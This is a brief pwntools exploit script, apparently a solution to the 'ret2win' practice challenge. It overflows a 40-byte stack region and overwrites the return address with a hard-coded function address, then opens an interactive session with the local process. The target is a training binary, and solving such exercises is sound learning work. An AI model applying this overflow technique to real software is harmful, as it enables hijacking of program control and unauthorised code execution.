from pwn import *

p = process('./ret2win')

#system_addr = 0x0400824
system_addr = 0x0000000000400811
pad = 'a'*32+'deadbeef'

payload = pad+p64(system_addr)

p.sendline(payload)
p.interactive()
